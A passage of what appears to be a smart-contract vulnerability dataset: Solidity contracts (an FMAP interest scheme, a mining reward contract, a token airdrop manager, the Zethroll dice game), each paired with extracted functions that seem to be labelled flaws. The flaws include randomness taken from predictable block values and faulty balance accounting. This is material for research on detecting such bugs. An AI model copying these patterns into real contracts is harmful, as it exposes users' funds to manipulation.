players_[acceptOrder.playerAddress].totalAccepted = amount.add(players_[acceptOrder.playerAddress].totalAccepted);\n players_[acceptOrder.playerAddress].acceptOrderCount++;\n if (restOfferAmount_ > 0) {\n matching();\n }\n calcAndSetPlayerTotalCanAccept(acceptOrder.playerAddress, amount);\n emit onAccepted(acceptOrder.playerAddress, acceptOrder.acceptAmount);\n return (canAcceptLeft);\n }\n function withdraw() isHuman() public {\n require(players_[msg.sender].balance >= 1 finney, \"sorry, withdraw at least 1 finney\");\n uint256 _balance = players_[msg.sender].balance;\n players_[msg.sender].balance = 0;\n msg.sender.transfer(_balance);\n emit onWithdraw(msg.sender, _balance);\n }\n function getCanAcceptAmount(address playerAddr) public view returns (uint256 canAccept, uint256 earliest) {\n (canAccept, earliest) = calcCanAcceptAmount(playerAddr, true, 0);\n return (canAccept, earliest);\n }\n function getBalance(address playerAddr) public view returns (uint256) {\n uint256 balance = players_[playerAddr].balance;\n return (balance);\n }\n function getPlayerInfo(address playerAddr) public view\n returns (uint256 totalAssets, uint256 nextPeriodAssets, uint256 balance, uint256 canAccept, uint256 airdrop, uint256 offered, uint256 accepted, uint256 affiliateEarned, uint256 siteEarned, uint256 nextUpdateTime) {\n FMAPDatasets.Player memory _player = players_[playerAddr];\n uint256 _calculatedCanAccept;\n (_calculatedCanAccept, ) = calcCanAcceptAmount(playerAddr, false, 0);\n totalAssets = _player.balance.add(_calculatedCanAccept);\n (_calculatedCanAccept, ) = calcCanAcceptAmount(playerAddr, false, interestPeriod_);\n nextPeriodAssets = _player.balance.add(_calculatedCanAccept);\n (canAccept, nextUpdateTime) = calcCanAcceptAmount(playerAddr, true, 0);\n return (totalAssets, nextPeriodAssets, _player.balance, canAccept, _player.airDroped, _player.totalOffered, _player.totalAccepted, _player.affiliateEarned, _player.siteEarned, nextUpdateTime);\n }\n function packageOfferInfo(address siteOwner, uint256 amount) private view returns (FMAPDatasets.OfferInfo) {\n FMAPDatasets.OfferInfo memory offerInfo;\n offerInfo.playerAddress = msg.sender;\n offerInfo.offerAmount = amount;\n offerInfo.affiliateAddress = players_[msg.sender].lastAffiliate;\n offerInfo.siteOwner = siteOwner;\n offerInfo.timestamp = block.timestamp;\n offerInfo.interesting = true;\n return (offerInfo);\n }\n function offerCore(FMAPDatasets.OfferInfo memory offerInfo, bool updateAff) private {\n uint256 _fee = (offerInfo.offerAmount).mul(feePercent_).div(100);\n uint256 _aff = (offerInfo.offerAmount).mul(affPercent_).div(100);\n uint256 _sit = (offerInfo.offerAmount).mul(sitePercent_).div(100);\n uint256 _air = (offerInfo.offerAmount).mul(airDropPercent_).div(100);\n uint256 _xt = (offerInfo.offerAmount).mul(xTokenPercent_).div(100);\n uint256 _leftAmount = offerInfo.offerAmount;\n if (offerInfo.affiliateAddress == offerInfo.siteOwner) {\n offerInfo.affiliateAddress = address(0);\n }\n players_[offerInfo.playerAddress].totalOffered = (offerInfo.offerAmount).add(players_[offerInfo.playerAddress].totalOffered);\n if (offerInfo.affiliateAddress == address(0) || offerInfo.affiliateAddress == offerInfo.playerAddress) {\n _fee = _fee.add(_aff);\n _aff = 0;\n }\n if (offerInfo.siteOwner == address(0) || offerInfo.siteOwner == offerInfo.playerAddress) {\n _fee = _fee.add(_sit);\n _sit = 0;\n }\n _totalFee = _totalFee.add(_fee);\n _totalXT = _totalXT.add(_xt);\n if (_totalXT > 1 finney) {\n xTokenAddress.transfer(_totalXT);\n }\n _leftAmount = _leftAmount.sub(_fee);\n if (_aff > 0) {\n players_[offerInfo.affiliateAddress].balance = _aff.add(players_[offerInfo.affiliateAddress].balance);\n players_[offerInfo.affiliateAddress].affiliateEarned = _aff.add(players_[offerInfo.affiliateAddress].affiliateEarned);\n _leftAmount = _leftAmount.sub(_aff);\n }\n if (_sit > 0) {\n players_[offerInfo.siteOwner].balance = _sit.add(players_[offerInfo.siteOwner].balance);\n players_[offerInfo.siteOwner].siteEarned = _sit.add(players_[offerInfo.siteOwner].siteEarned);\n _leftAmount = _leftAmount.sub(_sit);\n }\n if (offerInfo.offerAmount >= 1 finney) {\n airDropTracker_ = airDropTracker_ + FMAPMath.calcTrackerCount(offerInfo.offerAmount);\n if (airdrop() == true) {\n uint256 _airdrop = FMAPMath.calcAirDropAmount(offerInfo.offerAmount);\n players_[offerInfo.playerAddress].balance = _airdrop.add(players_[offerInfo.playerAddress].balance);\n players_[offerInfo.playerAddress].airDroped = _airdrop.add(players_[offerInfo.playerAddress].airDroped);\n emit onAirDrop(offerInfo.playerAddress, _airdrop, offerInfo.offerAmount);\n }\n }\n airDropPool_ = airDropPool_.add(_air);\n _leftAmount = _leftAmount.sub(_air);\n if (updateAff) {\n players_[offerInfo.playerAddress].lastAffiliate = offerInfo.affiliateAddress;\n }\n restOfferAmount_ = restOfferAmount_.add(_leftAmount);\n if (currentOrder_.acceptAmount > currentOrder_.acceptedAmount) {\n matching();\n }\n playerOfferOrders_[offerInfo.playerAddress][players_[offerInfo.playerAddress].offeredCount] = offerInfo;\n players_[offerInfo.playerAddress].offeredCount = (players_[offerInfo.playerAddress].offeredCount).add(1);\n if (players_[offerInfo.playerAddress].playerAddress == address(0)) {\n players_[offerInfo.playerAddress].playerAddress = offerInfo.playerAddress;\n }\n }\n function matching() private {\n while (restOfferAmount_ > 0 && currentOrder_.acceptAmount > currentOrder_.acceptedAmount) {\n uint256 needAcceptAmount = (currentOrder_.acceptAmount).sub(currentOrder_.acceptedAmount);\n if (needAcceptAmount <= restOfferAmount_) {\n restOfferAmount_ = restOfferAmount_.sub(needAcceptAmount);\n players_[currentOrder_.playerAddress].balance = needAcceptAmount.add(players_[currentOrder_.playerAddress].balance);\n currentOrder_.acceptedAmount = (currentOrder_.acceptedAmount).add(needAcceptAmount);\n currentOrder_ = acceptOrders_[currentOrder_.nextOrder];\n } else {\n currentOrder_.acceptedAmount = (currentOrder_.acceptedAmount).add(restOfferAmount_);\n players_[currentOrder_.playerAddress].balance = (players_[currentOrder_.playerAddress].balance).add(restOfferAmount_);\n restOfferAmount_ = 0;\n }\n }\n }\n function calcAndSetPlayerTotalCanAccept(address pAddr, uint256 acceptAmount) private {\n uint256 _now = block.timestamp;\n uint256 _latestCalced = players_[pAddr].lastCalcOfferNo;\n uint256 _acceptedAmount = acceptAmount;\n while(_latestCalced < players_[pAddr].offeredCount) {\n FMAPDatasets.OfferInfo storage oi = playerOfferOrders_[pAddr][_latestCalced];\n uint256 _ts = _now.sub(oi.timestamp);\n if (oi.interesting == true) {\n if (_ts >= maxInterestTime_) {\n uint256 interest1 = oi.offerAmount.sub(oi.acceptAmount).mul(1).div(1000).mul(maxInterestTime_ / interestPeriod_);\n players_[pAddr].canAccept = (players_[pAddr].canAccept).add(oi.offerAmount).add(interest1);\n oi.interesting = false;\n if (oi.offerAmount.sub(oi.acceptAmount) > _acceptedAmount) {\n _acceptedAmount = 0;\n oi.acceptAmount = oi.acceptAmount.add(_acceptedAmount);\n } else {\n _acceptedAmount = _acceptedAmount.sub(oi.offerAmount.sub(oi.acceptAmount));\n oi.acceptAmount = oi.offerAmount;\n }\n } else if (_acceptedAmount > 0) {\n if (_acceptedAmount < oi.offerAmount.sub(oi.acceptAmount)) {\n oi.acceptAmount = oi.acceptAmount.add(_acceptedAmount);\n _acceptedAmount = 0;\n } else {\n uint256 interest0 = oi.offerAmount.sub(oi.acceptAmount).mul(1).div(1000).mul(_ts / interestPeriod_);\n players_[pAddr].canAccept = (players_[pAddr].canAccept).add(oi.offerAmount).add(interest0);\n oi.interesting = false;\n _acceptedAmount = _acceptedAmount.sub(oi.offerAmount.sub(oi.acceptAmount));\n oi.acceptAmount = oi.offerAmount;\n }\n }\n } else if (oi.offerAmount > oi.acceptAmount && _acceptedAmount > 0) {\n if (oi.offerAmount.sub(oi.acceptAmount) > _acceptedAmount) {\n _acceptedAmount = 0;\n oi.acceptAmount = oi.acceptAmount.add(_acceptedAmount);\n } else {\n _acceptedAmount = _acceptedAmount.sub(oi.offerAmount.sub(oi.acceptAmount));\n oi.acceptAmount = oi.offerAmount;\n }\n }\n if (_acceptedAmount == 0) {\n break;\n }\n _latestCalced = _latestCalced + 1;\n }\n players_[pAddr].lastCalcOfferNo = _latestCalced;\n }\n function airdrop() private view returns (bool) {\n uint256 seed = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.timestamp, block.difficulty, block.gaslimit, airDropTracker_, block.coinbase, msg.sender)));\n if(seed - (seed / 10000).mul(10000) < airDropTracker_) {\n return (true);\n }\n return (false);\n }\n function calcCanAcceptAmount(address pAddr, bool isLimit, uint256 offsetTime) private view returns (uint256, uint256 nextUpdateTime) {\n uint256 _totalCanAccepted = players_[pAddr].canAccept;\n uint256 i = players_[pAddr].offeredCount;\n uint256 _now = block.timestamp.add(offsetTime);\n uint256 _nextUpdateTime = _now.add(interestPeriod_);\n for(;i > 0; i--) {\n FMAPDatasets.OfferInfo memory oi = playerOfferOrders_[pAddr][i - 1];\n if (oi.interesting == true) {\n uint256 timepassed = _now.sub(oi.timestamp);\n if (!isLimit || (timepassed >= interestPeriod_)) {\n uint256 interest;\n if (timepassed < maxInterestTime_) {\n interest = oi.offerAmount.sub(oi.acceptAmount).mul(1).div(1000).mul(timepassed / interestPeriod_);\n uint256 oiNextUpdateTime = (timepassed / interestPeriod_).add(1).mul(interestPeriod_).add(oi.timestamp);\n if (_nextUpdateTime > oiNextUpdateTime) {\n _nextUpdateTime = oiNextUpdateTime;\n }\n } else {\n interest = oi.offerAmount.sub(oi.acceptAmount).mul(1).div(1000).mul(maxInterestTime_ / interestPeriod_);\n }\n _totalCanAccepted = _totalCanAccepted.add(oi.offerAmount).add(interest);\n }\n } else if (oi.timestamp == 0) {\n continue;\n } else {\n break;\n }\n }\n return (_totalCanAccepted.sub(players_[pAddr].totalAccepted), _nextUpdateTime);\n }\n}\nlibrary FMAPMath {\n using SafeMath for uint256;\n function calcTrackerCount(uint256 ethAmount) internal pure returns (uint256) {\n if (ethAmount >= 1 finney && ethAmount < 10 finney) {\n return (1);\n } else if (ethAmount < 50 finney) {\n return (2);\n } else if (ethAmount < 200 finney) {\n return (3);\n } else if (ethAmount < 500 finney) {\n return (4);\n } else if (ethAmount < 1 ether) {\n return (5);\n } else if (ethAmount >= 1 ether) {\n return ethAmount.div(1 ether).add(5);\n }\n return (0);\n }\n function calcAirDropAmount(uint256 ethAmount) internal pure returns (uint256) {\n if (ethAmount >= 1 finney && ethAmount < 10 finney) {\n return (5);\n } else if (ethAmount < 50 finney) {\n return (10);\n } else if (ethAmount < 200 finney) {\n return (15);\n } else if (ethAmount < 500 finney) {\n return (20);\n } else if (ethAmount < 1 ether) {\n return (25);\n } else if (ethAmount >= 1 ether) {\n uint256 a = ethAmount.div(1 ether).add(5).mul(5);\n return (a > 75 ? 75 : a);\n }\n return (0);\n }\n}\nlibrary FMAPDatasets {\n struct OfferInfo {\n address playerAddress;\n uint256 offerAmount;\n uint256 acceptAmount;\n address affiliateAddress;\n address siteOwner;\n uint256 timestamp;\n bool interesting;\n }\n struct AcceptOrder {\n uint256 orderId;\n address playerAddress;\n uint256 acceptAmount;\n uint256 acceptedAmount;\n uint256 nextOrder;\n }\n struct Player {\n address playerAddress;\n address lastAffiliate;\n uint256 totalOffered;\n uint256 totalAccepted;\n uint256 airDroped;\n uint256 balance;\n uint256 offeredCount;\n uint256 acceptOrderCount;\n uint256 canAccept;\n uint256 lastCalcOfferNo;\n uint256 affiliateEarned;\n uint256 siteEarned;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary AddressUtils {\n function isContract(address addr) internal view returns (bool) {\n uint256 size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}",
  "extract_feature": [
    "function packageOfferInfo(address siteOwner, uint256 amount) private view returns (FMAPDatasets.OfferInfo) {\nFMAPDatasets.OfferInfo memory offerInfo;\nofferInfo.playerAddress = msg.sender;\nofferInfo.offerAmount = amount;\nofferInfo.affiliateAddress = players_[msg.sender].lastAffiliate;\nofferInfo.siteOwner = siteOwner;\nofferInfo.timestamp = block.timestamp;\nofferInfo.interesting = true;\nreturn (offerInfo);\n}",
    "function calcAndSetPlayerTotalCanAccept(address pAddr, uint256 acceptAmount) private {\nuint256 _now = block.timestamp;\nuint256 _latestCalced = players_[pAddr].lastCalcOfferNo;\nuint256 _acceptedAmount = acceptAmount;\nwhile(_latestCalced < players_[pAddr].offeredCount) {\nFMAPDatasets.OfferInfo storage oi = playerOfferOrders_[pAddr][_latestCalced];\nuint256 _ts = _now.sub(oi.timestamp);\nif (oi.interesting == true) {\nif (_ts >= maxInterestTime_) {\nuint256 interest1 = oi.offerAmount.sub(oi.acceptAmount).mul(1).div(1000).mul(maxInterestTime_ / interestPeriod_);\nplayers_[pAddr].canAccept = (players_[pAddr].canAccept).add(oi.offerAmount).add(interest1);\noi.interesting = false;\nif (oi.offerAmount.sub(oi.acceptAmount) > _acceptedAmount) {\n_acceptedAmount = 0;\noi.acceptAmount = oi.acceptAmount.add(_acceptedAmount);\n} else {\n_acceptedAmount = _acceptedAmount.sub(oi.offerAmount.sub(oi.acceptAmount));\noi.acceptAmount = oi.offerAmount;\n}\n} else if (_acceptedAmount > 0) {\nif (_acceptedAmount < oi.offerAmount.sub(oi.acceptAmount)) {\noi.acceptAmount = oi.acceptAmount.add(_acceptedAmount);\n_acceptedAmount = 0;\n} else {\nuint256 interest0 = oi.offerAmount.sub(oi.acceptAmount).mul(1).div(1000).mul(_ts / interestPeriod_);\nplayers_[pAddr].canAccept = (players_[pAddr].canAccept).add(oi.offerAmount).add(interest0);\noi.interesting = false;\n_acceptedAmount = _acceptedAmount.sub(oi.offerAmount.sub(oi.acceptAmount));\noi.acceptAmount = oi.offerAmount;\n}\n}\n} else if (oi.offerAmount > oi.acceptAmount && _acceptedAmount > 0) {\nif (oi.offerAmount.sub(oi.acceptAmount) > _acceptedAmount) {\n_acceptedAmount = 0;\noi.acceptAmount = oi.acceptAmount.add(_acceptedAmount);\n} else {\n_acceptedAmount = _acceptedAmount.sub(oi.offerAmount.sub(oi.acceptAmount));\noi.acceptAmount = oi.offerAmount;\n}\n}\nif (_acceptedAmount == 0) {\nbreak;\n}\n_latestCalced = _latestCalced + 1;\n}\nplayers_[pAddr].lastCalcOfferNo = _latestCalced;\n}",
    "function airdrop() private view returns (bool) {\nuint256 seed = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.timestamp, block.difficulty, block.gaslimit, airDropTracker_, block.coinbase, msg.sender)));\nif(seed - (seed / 10000).mul(10000) < airDropTracker_) {\nreturn (true);\n}\nreturn (false);\n}",
    "function calcCanAcceptAmount(address pAddr, bool isLimit, uint256 offsetTime) private view returns (uint256, uint256 nextUpdateTime) {\nuint256 _totalCanAccepted = players_[pAddr].canAccept;\nuint256 i = players_[pAddr].offeredCount;\nuint256 _now = block.timestamp.add(offsetTime);\nuint256 _nextUpdateTime = _now.add(interestPeriod_);\nfor(;i > 0; i--) {\nFMAPDatasets.OfferInfo memory oi = playerOfferOrders_[pAddr][i - 1];\nif (oi.interesting == true) {\nuint256 timepassed = _now.sub(oi.timestamp);\nif (!isLimit || (timepassed >= interestPeriod_)) {\nuint256 interest;\nif (timepassed < maxInterestTime_) {\ninterest = oi.offerAmount.sub(oi.acceptAmount).mul(1).div(1000).mul(timepassed / interestPeriod_);\nuint256 oiNextUpdateTime = (timepassed / interestPeriod_).add(1).mul(interestPeriod_).add(oi.timestamp);\nif (_nextUpdateTime > oiNextUpdateTime) {\n_nextUpdateTime = oiNextUpdateTime;\n}\n} else {\ninterest = oi.offerAmount.sub(oi.acceptAmount).mul(1).div(1000).mul(maxInterestTime_ / interestPeriod_);\n}\n_totalCanAccepted = _totalCanAccepted.add(oi.offerAmount).add(interest);\n}\n} else if (oi.timestamp == 0) {\ncontinue;\n} else {\nbreak;\n}\n}\nreturn (_totalCanAccepted.sub(players_[pAddr].totalAccepted), _nextUpdateTime);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b12"
  },
  "filename": "112.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function add(uint a, uint b) internal pure returns (uint c) {\n c = a + b;\n require(c >= a);\n }\n function sub(uint a, uint b) internal pure returns (uint c) {\n require(b <= a);\n c = a - b;\n }\n function mul(uint a, uint b) internal pure returns (uint c) {\n c = a * b;\n require(a == 0 || c / a == b);\n }\n function div(uint a, uint b) internal pure returns (uint c) {\n require(b > 0);\n c = a / b;\n }\n}\ncontract Owned {\n address public owner;\n address public newOwner;\n event OwnershipTransferred(address indexed _from, address indexed _to);\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n require(msg.sender == newOwner);\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n newOwner = address(0);\n }\n}\ncontract ERC20Interface {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract ERC918Interface {\n function getChallengeNumber() public constant returns (bytes32);\n function getMiningDifficulty() public constant returns (uint);\n function getMiningTarget() public constant returns (uint);\n function getMiningReward() public constant returns (uint);\n function mint(uint256 nonce, bytes32 challenge_digest) public returns (bool success);\n event Mint(address indexed from, uint reward_amount, uint epochCount, bytes32 newChallengeNumber);\n address public lastRewardTo;\n uint public lastRewardAmount;\n uint public lastRewardEthBlockNumber;\n bytes32 public challengeNumber;\n}\ncontract ZeroGoldPOWMining is Owned {\n using SafeMath for uint;\n ERC20Interface zeroGold;\n ERC918Interface public miningLeader;\n address public mintHelper = 0x0;\n modifier onlyMintHelper {\n require(msg.sender == mintHelper);\n _;\n }\n uint rewardDivisor = 20;\n uint epochCount = 0;\n uint public lastRewardAmount = 0;\n mapping(bytes32 => bytes32) solutionForChallenge;\n event Mint(address indexed from, uint reward_amount, uint epochCount, bytes32 newChallengeNumber);\n constructor(address _miningLeader, address _mintHelper) public {\n miningLeader = ERC918Interface(_miningLeader);\n mintHelper = _mintHelper;\n zeroGold = ERC20Interface(0x6ef5bca539A4A01157af842B4823F54F9f7E9968);\n }\n function merge() external onlyMintHelper returns (bool success) {\n bytes32 futureChallengeNumber = blockhash(block.number - 1);\n bytes32 challengeNumber = miningLeader.getChallengeNumber();\n if (challengeNumber == futureChallengeNumber) {\n return false;\n }\n if (miningLeader.lastRewardTo() != msg.sender) {\n return false;\n }\n if (miningLeader.lastRewardEthBlockNumber() != block.number) {\n return false;\n }\n bytes32 parentChallengeNumber = miningLeader.challengeNumber();\n bytes32 solution = solutionForChallenge[parentChallengeNumber];\n if (solution != 0x0) return false;\n bytes32 digest = 'merge';\n solutionForChallenge[parentChallengeNumber] = digest;\n uint rewardAmount = getRewardAmount();\n uint balance = zeroGold.balanceOf(address(this));\n assert(rewardAmount <= balance);\n lastRewardAmount = rewardAmount;\n epochCount = epochCount.add(1);\n emit Mint(msg.sender, rewardAmount, epochCount, 0);\n return true;\n }\n function transfer(\n address _wallet,\n uint _reward\n ) external onlyMintHelper returns (bool) {\n if (_reward > lastRewardAmount) {\n return false;\n }\n lastRewardAmount = lastRewardAmount.sub(_reward);\n zeroGold.transfer(_wallet, _reward);\n }\n function getRewardAmount() public constant returns (uint) {\n uint totalBalance = zeroGold.balanceOf(address(this));\n return totalBalance.div(rewardDivisor);\n }\n function setMiningLeader(address _miningLeader) external onlyOwner {\n miningLeader = ERC918Interface(_miningLeader);\n }\n function setMintHelper(address _mintHelper) external onlyOwner {\n mintHelper = _mintHelper;\n }\n function setRewardDivisor(uint _rewardDivisor) external onlyOwner {\n rewardDivisor = _rewardDivisor;\n }\n function () public payable {\n revert('Oops! Direct payments are NOT permitted here.');\n }\n function transferAnyERC20Token(\n address tokenAddress, uint tokens\n ) public onlyOwner returns (bool success) {\n return ERC20Interface(tokenAddress).transfer(owner, tokens);\n }\n}",
  "extract_feature": [
    "function merge() external onlyMintHelper returns (bool success) {\nbytes32 futureChallengeNumber = blockhash(block.number - 1);\nbytes32 challengeNumber = miningLeader.getChallengeNumber();\nif (challengeNumber == futureChallengeNumber) {\nreturn false;\n}\nif (miningLeader.lastRewardTo() != msg.sender) {\nreturn false;\n}\nif (miningLeader.lastRewardEthBlockNumber() != block.number) {\nreturn false;\n}\nbytes32 parentChallengeNumber = miningLeader.challengeNumber();\nbytes32 solution = solutionForChallenge[parentChallengeNumber];\nif (solution != 0x0) return false;\nbytes32 digest = 'merge';\nsolutionForChallenge[parentChallengeNumber] = digest;\nuint rewardAmount = getRewardAmount();\nuint balance = zeroGold.balanceOf(address(this));\nassert(rewardAmount <= balance);\nlastRewardAmount = rewardAmount;\nepochCount = epochCount.add(1);\nemit Mint(msg.sender, rewardAmount, epochCount, 0);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b13"
  },
  "filename": "1121.sol",
  "content": "pragma solidity ^0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract Claimable is Ownable {\n address public pendingOwner;\n modifier onlyPendingOwner() {\n require(msg.sender == pendingOwner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n pendingOwner = newOwner;\n }\n function claimOwnership() onlyPendingOwner public {\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n }\n}\ncontract SimpleFlyDropToken is Claimable {\n using SafeMath for uint256;\n ERC20 internal erc20tk;\n function setToken(address _token) onlyOwner public {\n require(_token != address(0));\n erc20tk = ERC20(_token);\n }\n function multiSend(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(_destAddrs.length == _values.length);\n uint256 i = 0;\n for (; i < _destAddrs.length; i = i.add(1)) {\n if (!erc20tk.transfer(_destAddrs[i], _values[i])) {\n break;\n }\n }\n return (i);\n }\n}\ncontract DelayedClaimable is Claimable {\n uint256 public end;\n uint256 public start;\n function setLimits(uint256 _start, uint256 _end) onlyOwner public {\n require(_start <= _end);\n end = _end;\n start = _start;\n }\n function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc67750a970a4fdc0b14"
  },
  "filename": "1149.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ZTHReceivingContract {\n function tokenFallback(address _from, uint _value, bytes _data) public returns (bool);\n}\ncontract ZTHInterface {\n function getFrontEndTokenBalanceOf(address who) public view returns (uint);\n function transfer(address _to, uint _value) public returns (bool);\n function approve(address spender, uint tokens) public returns (bool);\n}\ncontract Zethroll is ZTHReceivingContract {\n using SafeMath for uint;\n modifier betIsValid(uint _betSize, uint _playerNumber) {\n require( calculateProfit(_betSize, _playerNumber) < maxProfit\n && _betSize >= minBet\n && _playerNumber > minNumber\n && _playerNumber < maxNumber);\n _;\n }\n modifier gameIsActive {\n require(gamePaused == false);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n uint constant private MAX_INT = 2 ** 256 - 1;\n uint constant public maxProfitDivisor = 1000000;\n uint constant public maxNumber = 99;\n uint constant public minNumber = 2;\n uint constant public houseEdgeDivisor = 1000;\n bool public gamePaused;\n address public owner;\n address public ZethrBankroll;\n address public ZTHTKNADDR;\n ZTHInterface public ZTHTKN;\n uint public contractBalance;\n uint public houseEdge;\n uint public maxProfit;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet = 0;\n uint public totalBets;\n uint public totalZTHWagered;\n event LogBet(address sender, uint value, uint rollUnder);\n event LogResult(address player, uint result, uint rollUnder, uint profit, uint tokensBetted, bool won);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n event MaxProfitChanged(uint _oldMaxProfit, uint _newMaxProfit);\n event CurrentContractBalance(uint _tokens);\n constructor (address zthtknaddr, address zthbankrolladdr) public {\n owner = msg.sender;\n ZTHTKN = ZTHInterface(zthtknaddr);\n ZTHTKNADDR = zthtknaddr;\n ZethrBankroll = zthbankrolladdr;\n houseEdge = 990;\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(1e18);\n ZTHTKN.approve(zthbankrolladdr, MAX_INT);\n }\n function() public payable {}\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) internal view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function calculateProfit(uint _initBet, uint _roll)\n private\n view\n returns (uint)\n {\n return ((((_initBet * (100 - (_roll.sub(1)))) / (_roll.sub(1)) + _initBet)) * houseEdge / houseEdgeDivisor) - _initBet;\n }\n struct playerRoll{\n uint200 tokenValue;\n uint48 blockn;\n uint8 rollUnder;\n }\n mapping(address => playerRoll) public playerRolls;\n function _playerRollDice(uint _rollUnder, TKN _tkn) private\n gameIsActive\n betIsValid(_tkn.value, _rollUnder)\n {\n require(_tkn.value < ((2 ** 200) - 1));\n require(block.number < ((2 ** 48) - 1));\n require(_zthToken(msg.sender));\n playerRoll memory roll = playerRolls[_tkn.sender];\n require(block.number != roll.blockn);\n if (roll.blockn != 0) {\n _finishBet(false, _tkn.sender);\n }\n roll.blockn = uint48(block.number);\n roll.tokenValue = uint200(_tkn.value);\n roll.rollUnder = uint8(_rollUnder);\n playerRolls[_tkn.sender] = roll;\n emit LogBet(_tkn.sender, _tkn.value, _rollUnder);\n totalBets += 1;\n totalZTHWagered += _tkn.value;\n }\n function finishBet() public\n gameIsActive\n returns (uint)\n {\n return _finishBet(true, msg.sender);\n }\n function _finishBet(bool delete_it, address target) private returns (uint){\n playerRoll memory roll = playerRolls[target];\n require(roll.tokenValue > 0);\n require(roll.blockn != block.number);\n uint result;\n if (block.number - roll.blockn > 255) {\n result = 1000;\n } else {\n result = random(99, roll.blockn, target) + 1;\n }\n uint rollUnder = roll.rollUnder;\n if (result < rollUnder) {\n uint profit = calculateProfit(roll.tokenValue, rollUnder);\n if (profit > maxProfit){\n profit = maxProfit;\n }\n contractBalance = contractBalance.sub(profit);\n emit 